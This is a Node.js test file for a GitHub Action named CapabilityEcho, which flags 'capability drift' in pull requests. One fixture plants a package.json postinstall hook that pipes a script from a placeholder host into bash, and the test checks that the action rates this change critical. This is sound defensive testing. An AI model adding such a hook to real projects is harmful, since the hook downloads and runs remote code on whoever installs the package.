import test from 'node:test';
import assert from 'node:assert/strict';
import { execFile } from 'node:child_process';
import { mkdtemp, readFile, writeFile, mkdir, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import { promisify } from 'node:util';

const execFileAsync = promisify(execFile);
const testDir = dirname(fileURLToPath(import.meta.url));
const packageRoot = join(testDir, '..');

test('action.yml exposes capability drift outputs', async () => {
  const action = await readFile(join(packageRoot, 'action.yml'), 'utf8');
  assert.match(action, /name: CapabilityEcho/);
  assert.match(action, /changed-file-count/);
  assert.match(action, /fail-on/);
});

test('action.yml runs the checked-in JavaScript action without installing PR-local scripts first', async () => {
  const action = await readFile(join(packageRoot, 'action.yml'), 'utf8');

  assert.match(action, /runs:\s*\r?\n\s+using: node24\r?\n\s+main: dist\/action\.js/);
  assert.doesNotMatch(action, /using: composite/);
  assert.doesNotMatch(action, /npm ci/);
  assert.doesNotMatch(action, /npm run build/);
});

test('compiled action runtime is not ignored by git', async () => {
  const ignored = await execFileAsync('git', ['-C', packageRoot, 'check-ignore', 'dist/action.js']).then(
    () => true,
    (error) => {
      if (error && typeof error === 'object' && 'code' in error && error.code === 1) {
        return false;
      }

      throw error;
    }
  );

  assert.equal(ignored, false);
});

test('self-dogfood workflow uses the trusted repository action instead of PR-local action code', async () => {
  const workflow = await readFile(join(packageRoot, '.github/workflows/capabilityecho.yml'), 'utf8');
  assert.match(workflow, /uses: Conalh\/CapabilityEcho@main/);
  assert.doesNotMatch(workflow, /uses: \.\//);
  assert.match(workflow, /fetch-depth: 0/);
});

test('JavaScript action entrypoint emits outputs, summary, and GitHub annotations', async () => {
  const repo = await mkdtemp(join(tmpdir(), 'capabilityecho-action-'));
  const outputPath = join(repo, 'github-output.txt');
  const summaryPath = join(repo, 'github-summary.md');

  try {
    await execGit(repo, 'init', '-b', 'main');
    await execGit(repo, 'config', 'user.name', 'CapabilityEcho Test');
    await execGit(repo, 'config', 'user.email', 'capabilityecho@example.invalid');

    await writeProject(repo, {
      packageJson: {
        name: 'action-fixture',
        private: true,
        scripts: { test: 'vitest' }
      },
      source: "export function ok() {\n  return 'ok';\n}\n"
    });
    await execGit(repo, 'add', '.');
    await execGit(repo, 'commit', '-m', 'base app');
    const base = await gitStdout(repo, 'rev-parse', 'HEAD');

    await writeProject(repo, {
      packageJson: {
        name: 'action-fixture',
        private: true,
        scripts: {
          test: 'vitest',
          postinstall: 'curl https://install.example.com/setup.sh | bash'
        }
      },
      source: "export async function sync() {\n  await fetch('https://api.example.com/v1/events');\n}\n"
    });
    await execGit(repo, 'add', '.');
    await execGit(repo, 'commit', '-m', 'add capability drift');
    const head = await gitStdout(repo, 'rev-parse', 'HEAD');

    const { stdout } = await execFileAsync(process.execPath, ['dist/action.js'], {
      cwd: packageRoot,
      env: {
        ...process.env,
        INPUT_REPO: repo,
        INPUT_BASE: base,
        INPUT_HEAD: head,
        'INPUT_FAIL-ON': 'none',
        GITHUB_OUTPUT: outputPath,
        GITHUB_STEP_SUMMARY: summaryPath
      }
    });

    const outputs = await readFile(outputPath, 'utf8');
    const summary = await readFile(summaryPath, 'utf8');

    assert.match(outputs, /^rating=critical$/m);
    assert.match(outputs, /^finding-count=4$/m);
    assert.match(outputs, /^changed-file-count=2$/m);
    assert.match(summary, /# CapabilityEcho capability drift: CRITICAL/);
    assert.match(stdout, /::warning file=src\/client\.ts,line=2/);
    assert.match(stdout, /::warning file=package\.json,line=/);
  } finally {
    await rm(repo, { recursive: true, force: true });
  }
});

async function writeProject(repo, { packageJson, source }) {
  await mkdir(join(repo, 'src'), { recursive: true });
  await writeFile(join(repo, 'package.json'), `${JSON.stringify(packageJson, null, 2)}\n`, 'utf8');
  await writeFile(join(repo, 'src/client.ts'), source, 'utf8');
}

async function execGit(cwd, ...args) {
  await execFileAsync('git', ['-C', cwd, ...args]);
}

async function gitStdout(cwd, ...args) {
  const { stdout } = await execFileAsync('git', ['-C', cwd, ...args], { encoding: 'utf8' });
  return stdout.trim();
}
